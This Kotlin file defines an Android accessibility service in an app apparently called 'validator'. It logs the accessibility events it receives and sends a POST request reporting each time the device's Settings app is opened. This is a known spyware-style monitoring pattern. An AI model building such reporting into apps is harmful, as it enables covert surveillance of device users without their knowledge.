package com.evashadidi.validator

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.util.Log

class MyAccessibilityService : AccessibilityService() {

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event?.let {
            val packageName = it.packageName?.toString() ?: ""
            val eventType = it.eventType

            Log.d("ValidatorApp", "Event received: $eventType from package: $packageName")

            if (packageName == "com.android.settings" && eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                Log.d("ValidatorApp", "Settings app opened")
                NetworkUtils.sendPostRequest("Device settings opened")
            }
        }
    }

    override fun onInterrupt() {
        // Handle interrupt
    }
}